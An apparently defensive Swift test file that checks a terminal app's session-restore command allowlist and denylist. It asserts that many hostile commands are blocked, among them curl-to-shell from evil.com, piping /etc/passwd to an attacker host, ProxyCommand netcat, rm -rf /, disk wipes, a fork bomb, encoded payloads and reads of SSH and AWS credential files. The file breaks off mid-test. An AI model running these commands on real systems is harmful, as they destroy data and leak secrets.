        XCTAssertTrue(patterns.contains("opencode *"))
        XCTAssertTrue(patterns.contains("claude *"))
        XCTAssertTrue(patterns.contains("aider *"))
    }

    func testDefaultAllowlistIncludesDevServers() {
        let patterns = SessionRestoreCommandSettings.defaultAllowlistPatterns
        XCTAssertTrue(patterns.contains("npm run dev *"))
        XCTAssertTrue(patterns.contains("bun dev *"))
        XCTAssertTrue(patterns.contains("cargo run *"))
    }

    func testDefaultAllowlistExcludesDestructiveCommands() {
        // Verify dangerous commands are NOT in the default allowlist
        let patterns = SessionRestoreCommandSettings.defaultAllowlistPatterns
        XCTAssertFalse(patterns.contains("rm"))
        XCTAssertFalse(patterns.contains("rm *"))
        XCTAssertFalse(patterns.contains("sudo *"))
        XCTAssertFalse(patterns.contains("git push"))
    }

    func testDefaultAllowlistDoesNotMatchDestructiveCommands() {
        // Verify destructive commands don't match any default patterns
        let defaultRaw = SessionRestoreCommandSettings.defaultAllowlistPatterns.joined(separator: "\n")
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("rm -rf /", rawAllowlist: defaultRaw))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("sudo rm -rf /", rawAllowlist: defaultRaw))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("git push --force", rawAllowlist: defaultRaw))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("dd if=/dev/zero of=/dev/sda", rawAllowlist: defaultRaw))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("chmod -R 777 /", rawAllowlist: defaultRaw))
        // Also verify that watch (now removed) doesn't enable bypasses
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("watch rm -rf /tmp", rawAllowlist: defaultRaw))
    }

    // MARK: - Hardcoded Denylist Tests

    /// Helper to assert all commands in a list are blocked by the denylist
    private func assertAllBlocked(_ commands: [String], allowlist: String, file: StaticString = #file, line: UInt = #line) {
        for command in commands {
            XCTAssertFalse(
                SessionRestoreCommandSettings.isCommandAllowed(command, rawAllowlist: allowlist),
                "Expected '\(command)' to be blocked by denylist",
                file: file,
                line: line
            )
        }
    }

    func testDenylistBlocksDestructiveCommandsEvenIfInAllowlist() {
        // Even if user adds dangerous commands to allowlist, denylist should block them
        let dangerousAllowlist = "rm *\nsudo *\ndd *\nchmod *\ngit push --force *"
        assertAllBlocked([
            "rm -rf /",
            "sudo apt-get install",
            "dd if=/dev/zero of=/dev/sda",
            "chmod 777 /etc/passwd",
            "git push --force origin main",
        ], allowlist: dangerousAllowlist)
    }

    func testDenylistTakesPrecedenceOverAllowlist() {
        // Verify the security model: denylist is checked FIRST, allowlist SECOND
        // A command must pass denylist AND match allowlist to be allowed

        // Case 1: Command matches allowlist but is blocked by denylist -> BLOCKED
        let allowlist = "opencode *\ncurl *\nsudo *"
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode --continue", rawAllowlist: allowlist),
                      "Safe allowlisted command should be allowed")
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("curl http://example.com", rawAllowlist: allowlist),
                       "curl is in denylist (dangerous executable) even though allowlisted")
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("sudo echo hello", rawAllowlist: allowlist),
                       "sudo is in denylist even though allowlisted")

        // Case 2: Command passes denylist but not in allowlist -> BLOCKED
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("vim file.txt", rawAllowlist: allowlist),
                       "Safe command not in allowlist should be blocked")

        // Case 3: Command with denylist substring even if base command is safe
        let allowlist2 = "myapp *"
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("myapp --config file.json", rawAllowlist: allowlist2),
                      "Safe command with safe args should be allowed")
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("myapp --password=secret", rawAllowlist: allowlist2),
                       "Allowlisted command with --password= arg is blocked by denylist")
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("myapp --token=abc123", rawAllowlist: allowlist2),
                       "Allowlisted command with --token= arg is blocked by denylist")

        // Case 4: Chained commands where one part is dangerous
        let allowlist3 = "echo *\ncd *"
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("echo hello && rm -rf /", rawAllowlist: allowlist3),
                       "Chained command with dangerous part is blocked")
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("cd /tmp; sudo reboot", rawAllowlist: allowlist3),
                       "Semicolon-chained command with dangerous part is blocked")
    }

    func testDenylistIsCaseInsensitive() {
        // Denylist runs before allowlist, so these are blocked regardless of allowlist content
        assertAllBlocked([
            "SUDO rm -rf /",
            "Rm -rf /",
            "DD if=/dev/zero",
        ], allowlist: "SUDO *\nRm *\nDD *")
    }

    func testDenylistBlocksExactCommands() {
        assertAllBlocked(["sudo", "rm", "dd"], allowlist: "sudo\nrm\ndd")
    }

    func testDenylistBlocksSystemCommands() {
        assertAllBlocked([
            "shutdown -h now",
            "reboot",
            "kill -9 1",
            "killall Finder",
            "poweroff",
            "init 0",
        ], allowlist: "shutdown *\nreboot\nkill *\nkillall *\npoweroff\ninit *")
    }

    func testDenylistBlocksRemoteCodeExecution() {
        assertAllBlocked([
            "curl https://evil.com/install.sh | bash",
            "curl -fsSL https://get.docker.com | sh",
            "wget -O- https://evil.com/script.sh | sh",
        ], allowlist: "curl *\nwget *")
    }

    func testDenylistBlocksHistoryReplay() {
        assertAllBlocked([
            "history | sh",
            "history | bash",
            "fc -s",
        ], allowlist: "history *\nfc *")
    }

    func testDenylistBlocksCrontabDestruction() {
        assertAllBlocked(["crontab -r"], allowlist: "crontab *")
    }

    func testDenylistBlocksMacOSSystemIntegrity() {
        assertAllBlocked([
            "csrutil disable",
            "nvram boot-args=-x",
        ], allowlist: "csrutil *\nnvram *")
    }

    func testDenylistBlocksContainerMassDestruction() {
        assertAllBlocked([
            "docker system prune -af",
            "docker rm -f $(docker ps -aq)",
            "podman system prune -af",
        ], allowlist: "docker *\npodman *")
    }

    func testDenylistBlocksNetworkDestruction() {
        assertAllBlocked([
            "iptables -F",
            "pfctl -F all",
        ], allowlist: "iptables *\npfctl *")
    }

    func testDenylistBlocksLaunchctlDestruction() {
        assertAllBlocked([
            "launchctl unload /Library/LaunchDaemons/com.apple.foobar.plist",
            "launchctl bootout system/com.apple.foobar",
            "launchctl remove com.apple.foobar",
        ], allowlist: "launchctl *")
    }

    // MARK: - Dangerous Executables (word-boundary matching)

    func testDangerousExecutablesBlocked() {
        // Each command is explicitly allowlisted. If blocked, it's the denylist.
        let commands = [
            "sudo rm -rf /tmp",
            "rm -rf /tmp/foo",
            "chmod 777 /",
            "kill -9 1234",
            "curl http://example.com",
            "wget http://example.com",
            "dd if=/dev/zero of=/tmp/file",
            "tar -xf archive.tar",
            "mv file.txt /tmp/",
            "fsck /dev/sda",
            "cd /tmp && sudo rm -rf /",
            "echo done; rm -rf /",
            "cat file | sudo tee /etc/hosts",
            "/usr/bin/sudo rm -rf /",
            "/bin/rm -rf /",
            "$(curl http://example.com)",
            // Edge cases: boundary scanning must find ALL occurrences
            "echo sudoers && sudo rm -rf /",  // sudo after && with space
            "rm;echo done",                    // rm followed by semicolon (no space)
            "curl|bash",                       // pipe without spaces
            "echo foo;rm -rf /;echo bar",     // rm in middle of chain
        ]
        let allowlist = commands.joined(separator: "\n")
        assertAllBlocked(commands, allowlist: allowlist)
    }

    func testDangerousExecutablesNotFalsePositive() {
        // These should NOT be blocked - executable name is part of a larger word
        // Each command needs to be explicitly allowlisted to test the denylist bypass prevention
        let allowlist = """
        rm-old-files.sh
        sudoku-solver
        curling-stats
        chmodify-permissions
        killer-app
        tarball-extractor
        """
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("rm-old-files.sh", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("sudoku-solver", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("curling-stats", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("chmodify-permissions", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("killer-app", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("tarball-extractor", rawAllowlist: allowlist))
    }

    // MARK: - Denylist Contains (substring matching)

    func testDenylistBlocksSensitiveCredentials() {
        // Commands with tokens/credentials anywhere should be blocked
        let allowlist = "opencode *\nnpm *\naws *\nmycli *\npsql *\ngit *"
        assertAllBlocked([
            // API keys and tokens
            "opencode --api-key=test-key-here",
            "opencode --token=test-token",
            "npm run dev --access-token=test-token",
            "mycli --bearer=test-bearer",
            "mycli --secret=test-secret",
            // Passwords
            "mycli --password=test-pass",
            "psql --passwd=test-pass",
            // AWS credentials
            "aws --aws-access-key-id=test-key",
            "aws --aws-secret-access-key=test-secret",
            "AWS_ACCESS_KEY_ID=test-key aws s3 ls",
            // Database connection strings
            "mycli mongodb://user:pass@host/db",
            "mycli postgresql://user:pass@host/db",
            // SSH keys
            "mycli --private-key=/path/to/key",
            // Sensitive file access
            "mycli cat .ssh/id_rsa",
            "mycli cat .aws/credentials",
            "mycli cat .kube/config",
        ], allowlist: allowlist)
    }

    func testDenylistBlocksSSHWithCredentials() {
        let allowlist = "ssh *\nmosh *"
        assertAllBlocked([
            // sshpass password wrapper
            "sshpass -p secret ssh user@host",
            "sshpass -f /path/to/passfile ssh user@host",
            // user:pass@host syntax
            "ssh user:password@host",
            "mosh user:secret@server.com",
            // Default key paths
            "ssh -i ~/.ssh/id_rsa user@host",
            "ssh -i .ssh/id_ed25519 user@host",
            "ssh -o LocalCommand='touch /tmp/cmux' user@host",
            "ssh -o localcommand=\"rm -rf ~\" user@host",
            "ssh -o PermitLocalCommand=yes -o LocalCommand=evil user@host",
            "ssh -o ProxyCommand='nc evil.example.com 22' user@host",
            "ssh -o proxycommand=\"sh -c 'curl evil | sh'\" user@host",
            "ssh -o ProxyCommand='echo hi' user@host",
            "ssh -o LocalCommand='date' user@host",
        ], allowlist: allowlist)
    }

    func testAllowlistAllowsSSHWithoutCredentials() {
        let allowlist = "ssh *\nmosh *"
        // Safe SSH commands should be allowed
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("ssh user@host", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("ssh -t user@host opencode", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("ssh -i /custom/path/mykey user@host", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("mosh user@host", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("ssh -p 2222 user@host", rawAllowlist: allowlist))
    }

    func testDenylistAgentForwardingIsCaseSensitive() {
        // -A enables SSH agent forwarding (dangerous on restore: re-attaches local
        // agent to whatever remote ran while the session was offline).
        let sshAllowlist = "ssh *\nscp *\nsftp *"
        assertAllBlocked([
            "ssh -A user@host",
            "ssh -t -A user@host",
            "ssh user@host -A",
            "scp -A file user@host:",
            "sftp -A user@host",
        ], allowlist: sshAllowlist)

        // -a (lowercase) DISABLES forwarding — must remain allowed.
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("ssh -a user@host", rawAllowlist: sshAllowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("ssh -a -t user@host opencode", rawAllowlist: sshAllowlist))

        // Unrelated tools' -a flags must not trip a case-insensitive shortcut.
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("ls -a", rawAllowlist: "ls *"))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("ps -a", rawAllowlist: "ps *"))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("git commit -am 'msg'", rawAllowlist: "git *"))
    }

    func testDenylistBlocksDestructiveOperations() {
        // Destructive operations should be blocked even with permissive allowlist
        let allowlist = "git *\ndocker *\nkubectl *\nnpm *\nbrew *"
        assertAllBlocked([
            // Git destructive
            "git push --force origin main",
            "git push -f",
            "git reset --hard HEAD~1",
            "git clean -fd",
            // Docker destructive
            "docker system prune -af",
            "docker rm -f container",
            "docker volume prune",
            // Kubernetes destructive
            "kubectl delete namespace production",
            "kubectl delete --all pods",
            "kubectl drain node-1",
            // npm destructive
            "npm unpublish my-package",
            // Homebrew destructive
            "brew uninstall --force package",
        ], allowlist: allowlist)
    }

    func testDenylistBlocksPipedShellExecution() {
        let allowlist = "echo *\ncat *"
        assertAllBlocked([
            "echo 'malicious' | sh",
            "cat script.sh | bash",
            "echo 'test' | /bin/sh",
            "history | bash",
        ], allowlist: allowlist)
    }

    func testDenylistAllowsSafeCommands() {
        let allowlist = "opencode *\nnpm *\ngit *\ndocker *"
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode --continue", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("npm run dev", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("git status", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("git push origin main", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("docker ps", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("docker logs container", rawAllowlist: allowlist))
    }

    // MARK: - MySQL Password Detection Tests

    func testDenylistBlocksMySQLWithPasswordFlag() {
        // MySQL-family tools use -p for password (unlike cargo/flask/npm which use it for port/package)
        let allowlist = "mysql *\nmariadb *\nmysqldump *\nmysqladmin *"
        assertAllBlocked([
            "mysql -u root -p database",
            "mysql -pMyPassword database",
            "mysql -u admin -p=secret",
            "mariadb -p database",
            "mysqldump -u root -p database > backup.sql",
            "mysqladmin -p status",
            "/usr/bin/mysql -u root -p",
        ], allowlist: allowlist)
    }

    func testDenylistAllowsMySQLWithoutPasswordFlag() {
        // MySQL commands without -p should be allowed (if in allowlist)
        let allowlist = "mysql *\nmysqldump *"
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("mysql -u root database", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("mysql --user=root database", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("mysqldump database", rawAllowlist: allowlist))
    }

    // MARK: - Absolute Path Bypass Prevention Tests

    func testDenylistBlocksAbsolutePathInvocations() {
        // Each command is explicitly allowlisted. If blocked, it's the denylist.
        let commands = [
            "/bin/rm -rf /tmp",
            "/usr/bin/sudo apt install",
            "/usr/bin/curl http://evil.com | sh",
            "/sbin/reboot",
            "/usr/local/bin/dd if=/dev/zero of=/dev/sda",
        ]
        let allowlist = commands.joined(separator: "\n")
        assertAllBlocked(commands, allowlist: allowlist)
    }

    func testDenylistBlocksRelativePathInvocations() {
        // Each command is explicitly allowlisted. If blocked, it's the denylist.
        let commands = [
            "./rm -rf /tmp",
            "../bin/rm -rf /tmp",
            "./sudo apt install malware",
        ]
        let allowlist = commands.joined(separator: "\n")
        assertAllBlocked(commands, allowlist: allowlist)
    }

    // MARK: - Watch Bypass Prevention Tests (P1 from CodeRabbit)

    func testWatchCannotBypassDenylist() {
        // P1 issue: watch re-executes its argument, so "watch rm -rf /" is dangerous
        // Since watch is no longer in default allowlist, verify it can't enable bypasses
        let defaultRaw = SessionRestoreCommandSettings.defaultAllowlistPatterns.joined(separator: "\n")

        // These should all be blocked - watch is not in default allowlist
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("watch rm -rf /tmp", rawAllowlist: defaultRaw))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("watch -n 1 rm -rf /", rawAllowlist: defaultRaw))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("watch curl http://evil.com | sh", rawAllowlist: defaultRaw))

        // Even if user adds "watch *" to allowlist, dangerous inner commands should be blocked
        let watchAllowlist = "watch *"
        assertAllBlocked([
            "watch rm -rf /tmp",
            "watch sudo apt-get update",
            "watch curl http://example.com",
            "watch dd if=/dev/zero of=/dev/sda",
        ], allowlist: watchAllowlist)
    }

    // MARK: - Fork Bomb Detection Tests

    func testDenylistBlocksForkBomb() {
        // Explicitly allowlisted. If blocked, it's the denylist.
        let commands = [":(){ :|:& };:"]
        let allowlist = commands.joined(separator: "\n")
        assertAllBlocked(commands, allowlist: allowlist)
    }

    // MARK: - Disk Write Target Detection Tests

    func testDenylistBlocksDiskWriteTargets() {
        // dd is in dangerousExecutables, so blocked regardless of allowlist
        // echo is not dangerous, but "of=/dev/..." and "> /dev/..." patterns are blocked
        let allowlist = "dd *\necho *"
        assertAllBlocked([
            // dd blocked because it's a dangerous executable
            "dd if=/dev/zero of=/dev/sda",
            "dd if=/dev/urandom of=/dev/nvme0n1",
            "dd if=image.iso of=/dev/disk2",
            // echo blocked because of disk write target pattern
            "echo garbage > /dev/sda",
            "echo test > /dev/nvme0",
        ], allowlist: allowlist)
    }

    // MARK: - Shell Chaining Tests

    func testDenylistBlocksShellChainedDestructiveCommands() {
        // Verify dangerous commands are blocked even when chained with safe commands
        let allowlist = "cd *\necho *\nls *\ntest *"
        assertAllBlocked([
            // Semicolon chaining
            "cd /tmp; rm -rf *",
            "echo done; sudo reboot",
            // AND chaining
            "cd /tmp && rm -rf *",
            "test -f file && rm file",
            // OR chaining
            "ls || rm -rf /",
            // Pipe chaining
            "ls | xargs rm",
            // Backtick subshell
            "echo `rm -rf /`",
            // $() subshell
            "echo $(sudo whoami)",
        ], allowlist: allowlist)
    }

    // MARK: - Environment Variable Manipulation Tests

    func testDenylistBlocksEnvironmentManipulation() {
        let allowlist = "export *\nunset *"
        assertAllBlocked([
            "unset PATH",
            "export PATH=",
            "export PATH=\"\"",
        ], allowlist: allowlist)
    }

    // MARK: - Database Connection String Tests

    func testDenylistBlocksDatabaseConnectionStrings() {
        // Connection strings often contain embedded credentials
        let allowlist = "psql *\nmongo *\nredis-cli *"
        assertAllBlocked([
            "psql postgresql://user:password@host/db",
            "psql postgres://admin:secret@localhost/mydb",
            "mongo mongodb://user:pass@host:27017/db",
            "mongo mongodb+srv://user:pass@cluster.mongodb.net/db",
            "redis-cli redis://user:password@host:6379",
            "redis-cli rediss://user:password@host:6379",
            "mycli mysql://root:password@localhost/db",
            "mycli amqp://user:pass@host/vhost",
        ], allowlist: allowlist)
    }

    // MARK: - Sensitive File Access Tests

    func testDenylistBlocksSensitiveFileAccess() {
        let allowlist = "cat *\nless *\nview *"
        assertAllBlocked([
            "cat /etc/shadow",
            "cat ~/.ssh/id_rsa",
            "cat ~/.ssh/id_ed25519",
            "cat ~/.ssh/authorized_keys",
            "cat ~/.aws/credentials",
            "cat ~/.kube/config",
            "cat ~/.npmrc",
            "cat ~/.netrc",
            "cat ~/.git-credentials",
            "cat ~/.docker/config.json",
            "less .ssh/id_ecdsa",
            "view .ssh/id_dsa",
        ], allowlist: allowlist)
    }

    // MARK: - Kubernetes Destructive Operations Tests

    func testDenylistBlocksKubernetesDestructive() {
        let allowlist = "kubectl *"
        assertAllBlocked([
            "kubectl delete namespace production",
            "kubectl delete ns kube-system",
            "kubectl delete --all pods",
            "kubectl drain node-1",
            "kubectl cordon node-1",
        ], allowlist: allowlist)
    }

    // MARK: - Git Checkout Force Tests

    func testDenylistBlocksGitCheckoutForce() {
        let allowlist = "git *"
        assertAllBlocked([
            "git checkout --force main",
            "git checkout --force .",
        ], allowlist: allowlist)
        // Regular checkout should be allowed
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("git checkout main", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("git checkout -b feature", rawAllowlist: allowlist))
    }

    // MARK: - System Service Tests

    func testDenylistBlocksSystemServiceDestruction() {
        let allowlist = "systemctl *\nlaunchctl *\nservice *"
        assertAllBlocked([
            "systemctl stop nginx",
            "systemctl disable sshd",
            "systemctl mask docker",
            "launchctl unload /Library/LaunchDaemons/com.example.plist",
            "launchctl bootout system/com.example.service",
            "service stop nginx",
        ], allowlist: allowlist)
        // Safe service commands should be allowed
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("systemctl status nginx", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("systemctl start nginx", rawAllowlist: allowlist))
    }

    // MARK: - Edge Case: Empty and Whitespace Commands

    func testEmptyCommandsNotAllowed() {
        // Empty commands are rejected before allowlist check (guard in isCommandAllowed).
        // Use any allowlist - the rejection happens at normalization stage.
        let allowlist = "npm *"
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("   ", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("\n\t", rawAllowlist: allowlist))
    }

    // MARK: - Validated Restore Command Helper Tests

    func testValidatedRestoreCommandReturnsNilForBlocked() {
        XCTAssertNil(SessionRestoreCommandSettings.validatedRestoreCommand("rm -rf /"))
        XCTAssertNil(SessionRestoreCommandSettings.validatedRestoreCommand("sudo reboot"))
        XCTAssertNil(SessionRestoreCommandSettings.validatedRestoreCommand(nil))
        XCTAssertNil(SessionRestoreCommandSettings.validatedRestoreCommand(""))
        XCTAssertNil(SessionRestoreCommandSettings.validatedRestoreCommand("   "))
    }

    func testValidatedRestoreCommandTrimsWhitespace() {
        // Default allowlist includes "opencode *"
        let result = SessionRestoreCommandSettings.validatedRestoreCommand("  opencode --continue  ")
        XCTAssertEqual(result, "opencode --continue")
    }

    func testValidatedRestoreCommandReturnsNilForNonAllowlisted() {
        // random-unknown-command is not in default allowlist
        XCTAssertNil(SessionRestoreCommandSettings.validatedRestoreCommand("random-unknown-command"))
    }

    // MARK: - Command Injection Prevention Tests

    func testCommandsWithNewlinesAreBlocked() {
        // Newlines in commands could enable injection attacks (e.g., "ssh host\nrm -rf ~")
        // The denylist should block commands containing newlines via piped shell patterns
        let allowlist = "ssh *\nopencode *"

        // Commands with literal newlines should be blocked by "| sh" / "| bash" patterns
        // or caught at the initialInput validation layer (GhosttyTerminalView)
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("ssh host\nrm -rf ~", rawAllowlist: allowlist),
                       "Command with embedded newline should be blocked")
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("opencode\n--malicious", rawAllowlist: allowlist),
                       "Command with embedded newline should be blocked")

        // Carriage returns should also be blocked
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("ssh host\rrm -rf ~", rawAllowlist: allowlist),
                       "Command with embedded carriage return should be blocked")
    }

    func testValidatedRestoreCommandRejectsNewlines() {
        // validatedRestoreCommand should reject commands with newlines
        XCTAssertNil(SessionRestoreCommandSettings.validatedRestoreCommand("opencode\n--flag"),
                     "validatedRestoreCommand should reject newlines")
        XCTAssertNil(SessionRestoreCommandSettings.validatedRestoreCommand("opencode\r--flag"),
                     "validatedRestoreCommand should reject carriage returns")
        XCTAssertNil(SessionRestoreCommandSettings.validatedRestoreCommand("ssh host\nrm -rf /"),
                     "validatedRestoreCommand should reject multi-line injection")
    }

    // MARK: - Allowlist Matching with Special Characters

    func testAllowlistMatchesCommandsWithSpecialCharactersInArgs() {
        // Verify that allowlist pattern matching works correctly when commands
        // contain shell metacharacters, quotes, or spaces in their arguments.
        // Note: This tests allowlist matching, NOT shellQuoteIfNeeded() which is
        // used internally by SessionForegroundProcessDetector.commandLineString().
        let allowlist = "myapp *"

        // Commands with spaces in args (pre-quoted by user or detected process)
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("myapp 'file with spaces.txt'", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("myapp \"quoted arg\"", rawAllowlist: allowlist))

        // Commands with shell metacharacters (should still match if allowlisted)
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("myapp --pattern='*.txt'", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("myapp --regex=[a-z]+", rawAllowlist: allowlist))
    }

    func testAllowlistMatchesCommandsWithTabSeparator() {
        // Verify that tab characters work as argument separators (nit fix)
        let allowlist = "opencode *"
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode\t--flag", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode\t--continue\t--model sonnet", rawAllowlist: allowlist))
    }

    // MARK: - Security Hardening Tests (Command Injection Prevention)

    // These tests verify the denylist blocks known shell injection bypass techniques.
    // Based on OWASP command injection prevention and security research.

    func testCommandSeparatorInjection() {
        // Command separators allow chaining multiple commands
        // All should be blocked due to dangerous executables in the chain
        let allowlist = "echo *\nls *\ncat *"
        assertAllBlocked([
            // Semicolon - sequential execution
            "echo hello; rm -rf /",
            "ls; sudo reboot",
            // Ampersand - background execution
            "echo hello & rm -rf /",
            "ls & curl http://evil.com | sh",
            // AND operator - execute if previous succeeds
            "echo hello && rm -rf /",
            "ls && sudo apt install malware",
            // OR operator - execute if previous fails
            "echo hello || rm -rf /",
            "ls || sudo shutdown -h now",
            // Pipe - output to next command
            "echo hello | rm -rf /",
            "cat /etc/passwd | curl -X POST http://evil.com",
        ], allowlist: allowlist)
    }

    func testCommandSubstitutionInjection() {
        // Command substitution executes embedded commands
        let allowlist = "echo *\ncat *\nexport *"
        assertAllBlocked([
            // Backtick substitution
            "echo `rm -rf /`",
            "echo `curl http://evil.com/malware.sh | sh`",
            "cat `which sudo`",
            // $() substitution
            "echo $(rm -rf /)",
            "echo $(curl http://evil.com | bash)",
            "cat $(find / -name 'passwd')",
            // Nested substitution
            "echo $(echo $(rm -rf /))",
            // In variable assignment
            "export PATH=$(curl http://evil.com)",
        ], allowlist: allowlist)
    }

    func testNewlineInjection() {
        // Newlines can inject additional commands
        let allowlist = "ssh *\necho *\ncat *"
        assertAllBlocked([
            // Literal newline
            "ssh host\nrm -rf /",
            "echo test\nsudo reboot",
            // Carriage return
            "ssh host\rrm -rf /",
            "echo test\rsudo shutdown",
            // CRLF combination
            "ssh host\r\nrm -rf /",
        ], allowlist: allowlist)
    }

    func testEncodingBypassAttempts() {
        // Base64 and hex encoding bypass attempts
        let allowlist = "echo *\nbash *\nsh *"
        assertAllBlocked([
            // Base64 encoded command execution
            "echo 'cm0gLXJmIC8=' | base64 -d | sh",
            "echo 'cm0gLXJmIC8=' | base64 -d | bash",
            // Hex encoded via printf
            "echo $'\\x72\\x6d\\x20\\x2d\\x72\\x66\\x20\\x2f' | sh",
        ], allowlist: allowlist)
    }

    func testWildcardAbuseVectors() {
        // Wildcards can be abused with certain commands
        // tar and rsync have dangerous flag injection via wildcards
        let allowlist = "tar *\nrsync *\nfind *"
        assertAllBlocked([
            // tar checkpoint abuse (tar is in dangerousExecutables)
            "tar -cf archive.tar --checkpoint=1 --checkpoint-action=exec=sh",
            "tar -xf archive.tar --checkpoint-action=exec='rm -rf /'",
            // rsync -e abuse (rsync is in dangerousExecutables)
            "rsync -e 'sh -c \"rm -rf /\"' src dst",
            // find -exec abuse
            "find / -name '*' -exec rm -rf {} \\;",
            "find . -exec /bin/sh -c 'curl evil.com | sh' \\;",
        ], allowlist: allowlist)
    }

    func testShellExpansionBypasses() {
        // Shell expansion techniques that might bypass naive filtering
        let allowlist = "echo *\ncat *"
        assertAllBlocked([
            // Brace expansion to form commands
            "echo {rm,-rf,/}",
            // Variable-based command construction (if eval'd)
            "echo $HOME; rm -rf /",
            // History expansion (if enabled)
            "echo test; !!",  // !! repeats last command
        ], allowlist: allowlist)
    }

    func testPathTraversalInCommands() {
        // Path traversal attempts to access sensitive files
        let allowlist = "cat *\nless *\nhead *"
        assertAllBlocked([
            // Direct path traversal to sensitive files
            "cat ../../../etc/shadow",
            "cat ../../../../etc/passwd",
            "less ../../../root/.ssh/id_rsa",
            // Home directory sensitive files
            "cat ~/.ssh/id_rsa",
            "cat ~/.aws/credentials",
            "head ~/.kube/config",
        ], allowlist: allowlist)
    }

    func testEnvironmentVariableInjection() {
        // Environment variable manipulation that could affect security
        let allowlist = "export *\nenv *\nset *"
        assertAllBlocked([
            // PATH manipulation
            "export PATH=",
            "export PATH=\"\"",
            "unset PATH",
            // LD_PRELOAD injection
            "export LD_PRELOAD=/tmp/evil.so",
            "env LD_PRELOAD=/tmp/evil.so /bin/ls",
            // Sensitive credential exposure
            "export AWS_ACCESS_KEY_ID=AKIAEXAMPLE",
            "export AWS_SECRET_ACCESS_KEY=secret",
        ], allowlist: allowlist)
    }

    func testInteractiveShellEscapes() {
        // Commands that spawn interactive shells
        let allowlist = "python *\nnode *\nruby *\nphp *"
        assertAllBlocked([
            // Python shell escape
            "python -c 'import os; os.system(\"rm -rf /\")'",
            "python3 -c 'import subprocess; subprocess.call([\"rm\", \"-rf\", \"/\"])'",
            // Node shell escape
            "node -e 'require(\"child_process\").execSync(\"rm -rf /\")'",
            // Ruby shell escape
            "ruby -e 'system(\"rm -rf /\")'",
            "ruby -e '`rm -rf /`'",
            // PHP shell escape
            "php -r 'system(\"rm -rf /\");'",
            "php -r 'exec(\"rm -rf /\");'",
        ], allowlist: allowlist)
    }

    func testNetworkExfiltrationVectors() {
        // Commands that could exfiltrate data
        let allowlist = "curl *\nwget *\nnc *"
        assertAllBlocked([
            // Curl data exfiltration
